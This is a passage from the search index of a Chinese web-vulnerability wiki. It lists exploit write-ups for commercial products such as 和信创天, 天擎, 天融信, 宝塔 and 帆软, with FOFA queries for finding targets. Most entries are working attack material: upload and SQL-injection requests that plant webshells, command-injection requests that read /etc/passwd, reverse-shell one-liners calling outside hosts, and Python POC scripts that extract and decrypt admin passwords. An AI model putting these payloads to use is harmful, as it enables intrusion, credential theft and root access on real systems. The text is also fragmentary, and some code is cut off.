RCE漏洞.html":{"url":"Web安全/和信创天/和信创天云桌面系统 远程命令执行 RCE漏洞/和信创天云桌面系统 远程命令执行 RCE漏洞.html","title":"和信创天云桌面系统 远程命令执行 RCE漏洞","keywords":"","body":"和信创天云桌面系统 远程命令执行 RCE漏洞 漏洞描述 和信创天云桌面系统存在前台任意文件上传漏洞 漏洞影响 [!NOTE] 和信创天云桌面系统 [!NOTE] FOFA: title=\"和信下一代云桌面VENGD\" 漏洞复现 请求包如下 POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: 127.0.0.1:2001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Referer: http://127.0.0.1:2001/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"2.php\" Content-Type: image/avif ------WebKitFormBoundaryfcKRltGv-- 漏洞分析 upload_file.php >> '.$msg.\"\\r\\n\"; file_put_contents($logFile,$msg,FILE_APPEND ); } //require(\"vesystem/msg_define/session_lib.php\"); if ($_FILES[\"file\"][\"error\"] > 0) { echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"\"; } else { echo \"_Requst:\"; /* foreach($_REQUEST as $name => $value) { $name.\"=\".$value.\"\"; } //echo \"_FILES:\"; foreach($_FILES as $array_name=>$array_value) { $array_name.\"=\".$array_value.\"\"; foreach($_FILES[$array_name] as $name => $value) { $name.\"=\".$value.\"\"; } } */ $l = $_GET['l']; //拆分字符串按“/”分割字符 $arrpath = explode(\"/\",$l); $m = count($arrpath); $file_e = \"\"; if ($m>1){ for($i=0;$i 直接就是任意文件上传，获取参数l然后上传的文件名路径为 /Upload/“.$l.”/“.$_FILES[“file”][“name”] Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:21 "},"Web安全/图创图书馆集群管理系统/图创图书馆集群管理系统存在任意文件读取漏洞/图创图书馆集群管理系统存在任意文件读取漏洞.html":{"url":"Web安全/图创图书馆集群管理系统/图创图书馆集群管理系统存在任意文件读取漏洞/图创图书馆集群管理系统存在任意文件读取漏洞.html","title":"图创图书馆集群管理系统存在任意文件读取漏洞","keywords":"","body":"图创图书馆集群管理系统存在任意文件读取漏洞 漏洞描述 广州图创计算机软件开发有限公司是集产品研发、应用集成、客户服务为一体的高新技术企业，主要目标是为图书馆行业用户提供高质量的应用软件系统设计、集成和维护服务，利用漏洞，攻击者可以读取 Windows 或 Linux 服务器上的任意文件。利用文件读取漏洞，攻击者可以获取到系统文件信息，从而造成敏感信息泄露。 漏洞影响 图创图书馆集群管理系统 FOFA \"广州图创\" && country=\"CN\" && body=\"/interlib/common/\" 漏洞复现 漏洞payload： /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini GET /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini HTTP/1.1 Host: XXX.XXX.XXX.XXX User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://xxx.xxx.xxx.xxx Connection: close Cookie: JSESSIONID=657073E5FCD2C4BA12239182D01B1993 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:22 "},"Web安全/天擎/天擎 前台SQL注入/天擎 前台SQL注入.html":{"url":"Web安全/天擎/天擎 前台SQL注入/天擎 前台SQL注入.html","title":"天擎 前台SQL注入","keywords":"","body":"天擎 前台SQL注入 漏洞描述 天擎 存在SQL注入,攻击者可以通过漏洞上传木马 漏洞影响 [!NOTE] 天擎 FOFA [!NOTE] title=\"360新天擎\" 漏洞复现 注入写shell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- 利用过程: 1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell 2. 通过注入点，创建一张表 O 3. 为 表O 添加一个新字段 T 并且写入shell内容 4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell) 5. 删除 表O 使用命令 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:23 "},"Web安全/天擎/天擎 未授权越权访问/天擎 未授权越权访问.html":{"url":"Web安全/天擎/天擎 未授权越权访问/天擎 未授权越权访问.html","title":"天擎 未授权越权访问","keywords":"","body":"天擎 未授权越权访问 漏洞描述 天擎 存在未授权越权访问，造成敏感信息泄露 漏洞影响 [!NOTE] 天擎 漏洞复现 GET /api/dbstat/gettablessize HTTP/1.1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:23 "},"Web安全/天融信/天融信LDP未授权访问漏洞/天融信LDP未授权访问漏洞.html":{"url":"Web安全/天融信/天融信LDP未授权访问漏洞/天融信LDP未授权访问漏洞.html","title":"天融信LDP未授权访问漏洞","keywords":"","body":"天融信LDP未授权访问漏洞 漏洞描述 天融信LDP存在未授权访问漏洞 漏洞影响 [!NOTE] 天融信LDP 漏洞复现 POC为 默认用户superman的uid=1 POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:24 "},"Web安全/天融信/天融信TopApp-LB 负载均衡系统Sql注入漏洞/天融信TopApp-LB 负载均衡系统Sql注入漏洞.html":{"url":"Web安全/天融信/天融信TopApp-LB 负载均衡系统Sql注入漏洞/天融信TopApp-LB 负载均衡系统Sql注入漏洞.html","title":"天融信TopApp-LB 负载均衡系统Sql注入漏洞","keywords":"","body":"天融信TopApp-LB 负载均衡系统Sql注入漏洞 1.利用POC: POST /acc/clsf/report/datasource.php HTTP/1.1 Host: localhost Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/x-www-form-urlencoded t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- +&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。 2.2个历史漏洞仍然可以复现。 https://www.uedbox.com/post/21626/ 用户名随意 密码:;id(天融信负载均衡TopApp-LB系统无需密码直接登陆) https://www.uedbox.com/post/22193/ 用户名: ; ping 9928e5.dnslog.info; echo 密码:任意 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:25 "},"Web安全/天融信/天融信数据防泄漏系统越权修改管理员密码/天融信数据防泄漏系统越权修改管理员密码.html":{"url":"Web安全/天融信/天融信数据防泄漏系统越权修改管理员密码/天融信数据防泄漏系统越权修改管理员密码.html","title":"天融信数据防泄漏系统越权修改管理员密码","keywords":"","body":"天融信数据防泄漏系统越权修改管理员密码 无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&action=mod_edit_pwd，接口未授权访问,造成直接修改任意用户密 码，默认superman账户uid为1 POST /?module=auth_user&action=mod_edit_pwd Cookie: username=superman; uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:27 "},"Web安全/安天/安天apt越权访问/安天apt越权访问.html":{"url":"Web安全/安天/安天apt越权访问/安天apt越权访问.html","title":"安天apt越权访问","keywords":"","body":"一：漏洞描述 安天 高级可持续威胁安全检测系统 存在越权访问漏洞，攻击者可以通过工具修改特定的返回包导致越权后台查看敏感信息 二: 漏洞影响 安天 高级可持续威胁安全检测系统 三: 漏洞复现 登录页面如下 其中抓包过程中发现请求的一个身份验证 Url {\"role\": \"\", \"login_status\": false, \"result\": \"ok\"} 其中 login_status 为 false, 将参数使用 Burp 替换响应包为 true 请求 /api/user/islogin 时成功越过身份验证 再次访问首页验证越权漏洞 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:28 "},"Web安全/安略网络准入控制系统/安略网络准入控制系统 任意文件上传漏洞/安略网络准入控制系统 任意文件上传漏洞.html":{"url":"Web安全/安略网络准入控制系统/安略网络准入控制系统 任意文件上传漏洞/安略网络准入控制系统 任意文件上传漏洞.html","title":"安略网络准入控制系统 任意文件上传漏洞","keywords":"","body":"安略网络准入控制系统 任意文件上传漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 {width=\"5.833333333333333in\" height=\"3.357933070866142in\"} POST /uai/download/uploadfileToPath.htm HTTP/1.1 HOST: www.0-sec.org ... ... -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- {width=\"5.833333333333333in\" height=\"1.9321555118110236in\"} {width=\"5.833333333333333in\" height=\"3.0186636045494315in\"} 参考链接 https://my.oschina.net/u/4391448/blog/4562455 https://blog.csdn.net/God\\_XiangYu/article/details/108555525 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:29 "},"Web安全/安美数字/安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞/安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞.html":{"url":"Web安全/安美数字/安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞/安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞.html","title":"安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞","keywords":"","body":"安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞 漏洞描述 安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行 漏洞影响 安美数字 酒店宽带运营系统 FOFA \"酒店宽带运营\" 漏洞复现 登录页面如下 存在漏洞的文件为 server_ping.php \\n\"; echo \"parent.doTestResult('$id', 'ok');\\n\"; echo \"\\n\"; } else { echo \"\\n\"; echo \"parent.doTestResult('$id', 'no');\\n\"; echo \"\\n\"; } ?> 漏洞位置为 $cmd = \"ping -c 2 -s 65 $ip\"; $fp = popen($cmd, \"r\"); GET传入 $ip参数 后直接命令执行，并且文件无权限要求 请求包为 GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def POC_1(target_url): vuln_url = target_url + \"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd>../../pq.txt \\033[0m\".format(target_url)) if \"parent\" in response.text and response.status_code == 200: vuln_url = target_url + \"/pq.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) if \"root:\" in response.text: print(\"\\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败:{} \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:31 "},"Web安全/宝塔/宝塔 Phpmyadmin 未授权访问漏洞/宝塔 Phpmyadmin 未授权访问漏洞.html":{"url":"Web安全/宝塔/宝塔 Phpmyadmin 未授权访问漏洞/宝塔 Phpmyadmin 未授权访问漏洞.html","title":"宝塔 Phpmyadmin 未授权访问漏洞","keywords":"","body":"宝塔 Phpmyadmin 未授权访问漏洞 一、漏洞简介 二、漏洞影响 Liunx版本7.4.2 windows版本6.8 三、复现过程 https://www.0-sec.org:888/pma/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:34 "},"Web安全/宝塔/宝塔linux面板小于6.0 存储形xss 0day漏洞getshell/宝塔linux面板小于6.0 存储形xss 0day漏洞getshell.html":{"url":"Web安全/宝塔/宝塔linux面板小于6.0 存储形xss 0day漏洞getshell/宝塔linux面板小于6.0 存储形xss 0day漏洞getshell.html","title":"宝塔linux面板小于6.0 存储形xss 0day漏洞getshell","keywords":"","body":"宝塔linux面板 漏洞描述 宝塔面板是什么就不说了，小于6.0的版本存在存储性xss，该版本比较古老了，如果遇到了还是可以一用。 漏洞影响 宝塔Linux面板 漏洞复现 假设我们已经通过网站漏洞或者ftp弱口令等,可以在web目录下进行文件上传 在web目录下上传一个文件名为 的文件 在宝塔后台浏览文件,触发payload 但是由于宝塔的session加了httponly,所以我们是无法获取到宝塔的cookie的,但是我们可以配合计划任务的一个csrf的漏洞来达到权限提升的效果 POC history.pushState('', '', '/') & /dev/tcp/1.1.1.1/1998 0>&1\" /> & /dev/tcp/1.1.1.1/1998 0>&1\" /> document.getElementById('a').click() 修改poc中的ip地址,保存到网页上传到test.com中,当宝塔管理员访问这个页面以后,会自动跳转到 后台会自动添加反弹shell的计划任务 现在准备就绪,只要让管理员打开这个网页就可以了 回到上传文件的地方,因为有触发点有字符数限制,所以用多个语句构造,因为执行顺序的关系,可能需要刷新一下文件管理即可触发 新建三个文件,文件名分别为 a b c payload触发以后会自动打开test.com网页 将上一步CSRF的payload部署到test.com,管理员浏览文件的时候即可触发,触发后五分钟会反弹shell root权限~ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:32 "},"Web安全/小额贷款系统/小额贷款系统-runtime日志文件泄露/小额贷款系统-runtime日志文件泄露.html":{"url":"Web安全/小额贷款系统/小额贷款系统-runtime日志文件泄露/小额贷款系统-runtime日志文件泄露.html","title":"小额贷款系统-runtime日志文件泄露","keywords":"","body":"小额贷款系统-runtime日志文件泄露 漏洞描述 小额贷款系统使用了Thinkphp，存在runtime日志泄露，后台还有个文件上传 漏洞影响 小额贷款系统 FOFA \"/Public/Manage/js/cvphp.js\" 漏洞复现 进入系统界面如图 利用工具:https://github.com/r3change/TPLogScan optional arguments: -h, --help show this help message and exit -u URL, --url URL target url -v {3,5}, --version {3,5} thinkphp version, default 3 -p PATH, --path PATH log path -y YEAR, --year YEAR datetime start year, default this year -m MONTH, --month MONTH datetime start month, default this month -d DAY, --day DAY datetime start day, default 1 示例：python3 TPLogScan.py -u URL -v 3 扫到的日志在TPLogData目录下 tips：因为fofa搜到的很多站都在国外，需要在python脚本中设置代理 import os os.environ[\"http_proxy\"] = \"http://127.0.0.1:xxx\" os.environ[\"https_proxy\"] = \"http://127.0.0.1:xxx\" 后台文件上传自己测吧 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:35 "},"Web安全/小鱼易连/小鱼易连视频系统-Nginx LUA脚本远程命令执行/小鱼易连视频系统-Nginx LUA脚本远程命令执行.html":{"url":"Web安全/小鱼易连/小鱼易连视频系统-Nginx LUA脚本远程命令执行/小鱼易连视频系统-Nginx LUA脚本远程命令执行.html","title":"小鱼易连视频系统-Nginx LUA脚本远程命令执行","keywords":"","body":"小鱼易连视频系统-Nginx LUA脚本远程命令执行 漏洞描述 小鱼易连视频会议系统LUA脚本权限分配不当,导致任意用户可利用root权限执行命令 漏洞影响 小鱼易连混合云 FOFA title=\"云视讯管理平台\" 漏洞复现 登录页面如下： 找到页面了之后寻找该该系统的OpenReaty页面，一般都在其他端口上。 然后本地进行openssl监听： 1、生成证书： openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes 2、进行监听： openssl s_server -quiet -key key.pem -cert cert.pem -port 443 3、构造反弹shell命令 mkfifo /tmp/s; /bin/sh -i &1 | openssl s_client -quiet -connect : > /tmp/s; rm /tmp/s 命令解释：1.mkfifo是创建一个命名管道，创建好了以后/tmp/s内容是空的2.然后不断执行那个bash反弹的命令，连接的地址从步骤1的文件里取3.找那个443连接往步骤1里的文件写入内容，估计是ip和端口4.最后shell弹好了就删除步骤1的文件 4、构造“package?path=”路径下命令执行语句，将上面反弹shell命令进行base64加密。 开始攻击： 1、请求目机机器上执行命令有三种方法： curl：curl \"http://ip/package?path=`echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh`\" 2、直接web上面请求： http://ip/package?path=echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh 3、burp抓包拦截请求，同web一样。 bp抓上面的请求会返回302，然后跳转404,不要慌，这时候去看你的监听服务器 监听服务器返回shell，直接root权限 接下来详细分析： 找机器来验证，环境为docker，上机查看： netstat -anvp | grep :80 返回结果如下： tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 16554/nginx: mas 运行在 80 端口的程序为 nginx，在宿主机中寻找 nginx 程序 find / -name nginx 发现宿主机中没有运行 nginx 于是尝试进入 k8s 中的容器寻找响应服务 docker ps | grep openresty 结果如下： b61e91356e49 \"/usr/local/openresty\" 最终在 k8s 中的 openresty 容器中发现了 nginx 程序/usr/local/openresty/nginx，查询 nginx 配置文件，发现配置文件当中引用了一行 lua 脚本： location = /package { proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Nginx-IP $server_addr; limit_req zone=normalfrequ burst=20 nodelay; content_by_lua_file lua/package.lua; } 查询该文件并查看文件内容 cat /usr/local/openresty/nginx/lua/package.lua local package_absolute_path = '/var/log/logs.tar.gz' local path = ngx.req.get_uri_args().path if nil == path then path = '/logs' end os.execute('rm -rf ' .. package_absolute_path) os.execute('tar -zcvPf ' .. package_absolute_path .. ' ' .. path) ngx.redirect('/log/logs.tar.gz?' .. os.time()) print('rm -rf ' .. package_absolute_path) os.execute('rm -rf ' .. package_absolute_path) return 仔细研究发现在配置文件中直接对path参数传入的字符串与rm -rf等命令进行拼接，没有进行文件白名单等过滤，攻击者可以通过构造特殊字符串对命令进行闭合，从而造成Linux命令注入。 谨记网络安全法，切勿用于非法用途 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:36 "},"Web安全/帆软报表/帆软 V9 任意文件覆盖文件上传/帆软 V9 任意文件覆盖文件上传.html":{"url":"Web安全/帆软报表/帆软 V9 任意文件覆盖文件上传/帆软 V9 任意文件覆盖文件上传.html","title":"帆软 V9 任意文件覆盖文件上传","keywords":"","body":"帆软 V9 任意文件覆盖文件上传 漏洞描述 帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传 漏洞影响 [!NOTE] 帆软 V9 漏洞复现 FineReport V9 注意: 这个漏洞是任意文件覆盖，上传 JSP 马，需要找已存在的 jsp 文件进行覆盖 Tomcat 启动帆软后默认存在的 JSP 文件: 比如:/tomcat-7.0.96/webapps/ROOT/index.jsp 覆盖 Tomcat 自带 ROOT 目录下的 index.jsp: POST /WebReport/ReportServer? op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update .jsp HTTP/1.1 Host: 192.168.169.138:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36 Connection: close Accept-Au: 0c42b2f264071be0507acea1876c74 Content-Type: text/xml;charset=UTF-8 Content-Length: 675 {\"__CONTENT__\":\"\",\"__CHARSET__\":\"UTF-8\"} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:37 "},"Web安全/帆软报表/帆软报表 v8.0 - 9.0 存在任意文件读取漏洞/帆软报表 v8.0 - 9.0 存在任意文件读取漏洞.html":{"url":"Web安全/帆软报表/帆软报表 v8.0 - 9.0 存在任意文件读取漏洞/帆软报表 v8.0 - 9.0 存在任意文件读取漏洞.html","title":"帆软报表 v8.0 - 9.0 存在任意文件读取漏洞","keywords":"","body":"帆软报表 v8.0 - 9.0 存在任意文件读取漏洞 漏洞描述 FineReport v8.0 - 9.0 任意文件读取漏洞，攻击者可以通过此漏洞获取敏感信息，为下一步攻击做准备。 漏洞影响 FineReport v8.0 FineReport v9.0 FOFA body=\"isSupportForgetPwd\" POC 登录界面如下： 查看当前目录路径 http:///WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..¤tUserName=admin¤tUserId=1&isWebReport=true 进一步读取此目录下的其他文件 可以通过../对目录进行遍历，从而获取自己想要的信息 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:38 "},"Web安全/帆软报表/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.html":{"url":"Web安全/帆软报表/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.html","title":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757","keywords":"","body":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757 漏洞描述 FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。 FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。 漏洞影响 FineReport FOFA body=\"isSupportForgetPwd\" 漏洞复现 出现漏洞的文件为 fr-applet-8.0.jar package com.fr.chart.web; import com.fr.base.FRContext; import com.fr.general.IOUtils; import com.fr.stable.CodeUtils; import com.fr.web.core.ActionNoSessionCMD; import com.fr.web.utils.WebUtils; import java.io.InputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, \"resourcepath\")); if (!WebUtils.invalidResourcePath(var4)) { InputStream var5 = FRContext.getCurrentEnv().readResource(var4); String var6 = IOUtils.inputStream2String(var5); var6 = var6.replace('\\ufeff', ' '); WebUtils.printAsString(var2, var6); } } public String getCMD() { return \"get_geo_json\"; } } 使用request将文件名传入 调用cjkDecode函数解密文件名 使用invalidResourcePath函数校验文件是否存在 最后使用readResource函数读取文件传输到浏览器上 默认目录为resources 其中的privilege.xml里面存储了后台的用户名密码 加密函数 public static String passwordEncode(String var0) { StringBuilder var1 = new StringBuilder(); var1.append(\"___\"); if (var0 == null) { return var1.toString(); } else { int var2 = 0; for(int var3 = 0; var3 解密函数 public static String passwordDecode(String var0) { if (var0 != null && var0.startsWith(\"___\")) { var0 = var0.substring(3); StringBuilder var1 = new StringBuilder(); int var2 = 0; for(int var3 = 0; var3 使用python写出的解密代码为 cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码 Password = \"\" cipher = cipher[3:] #截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) 这里使用上面讲述的原理进行复现,访问目标 路径分为两种 /WebReport/ReportServer ReportServer 访问POC为,读取密码文件 privilege.xml 使用解密脚本解密文件 得到密码，即可登陆后台系统，账户为 admin 漏洞利用POC import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 帆软报表 v8.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def decode_passwd(cipher): PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] # 掩码 Password = \"\" cipher = cipher[3:] # 截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) return Password def POC_1(target_url): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers) response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers) if \"部署页面\" in response_1.text: print(\"\\033[32m[o] 目标部署页面为: {} \\033[0m\".format(vuln_url_1)) POC_2(vuln_url_1) elif \"部署页面\" in response_2.text: print(\"\\033[32m[o] 目标部署页面为: {} \\033[0m\".format(vuln_url_2)) POC_2(vuln_url_2) else: print(\"\\033[31m[x] 目标漏洞无法利用 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用 {} \\033[0m\".format(e)) sys.exit(0) def POC_2(vuln_url_fileread): vuln_url = vuln_url_fileread + \"?op=chart&cmd=get_geo_json&resourcepath=privilege.xml\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) print(\"\\033[32m[o] 正在访问: {} \\033[0m\".format(vuln_url)) if \"rootManagerPassword\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标存在漏洞,读取敏感文件 \\n{} \\033[0m\".format(response.text)) user_name = re.findall(r'', response.text) cipher = re.findall(r'', response.text) password = decode_passwd(cipher[0]) print(\"\\033[34m[o] 后台账户密码为:{} {} \\033[0m\".format(user_name[0], password)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC 帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:41 "},"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 sql注入漏洞/彩虹外链网盘 v4.0 sql注入漏洞.html":{"url":"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 sql注入漏洞/彩虹外链网盘 v4.0 sql注入漏洞.html","title":"彩虹外链网盘 v4.0 sql注入漏洞","keywords":"","body":"彩虹外链网盘 v4.0 sql注入漏洞 一、漏洞简介 二、漏洞影响 彩虹外链网盘 v4.0 三、复现过程 在list.php中第12行判断如果接收的act参数为view就调用view函数 {width=\"5.833333333333333in\" height=\"2.5791590113735783in\"} 在list.php中的view函数内83行调用了viewfiles函数 {width=\"5.833333333333333in\" height=\"2.599246500437445in\"} viewfiles函数在\\includes\\display.func.php中 由于过滤的不严谨,可以直接联合查询,并有一个回显点 {width=\"5.833333333333333in\" height=\"3.217784339457568in\"} {width=\"5.833333333333333in\" height=\"3.57371719160105in\"} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:43 "},"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 任意文件读取漏洞（一）/彩虹外链网盘 v4.0 任意文件读取漏洞（一）.html":{"url":"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 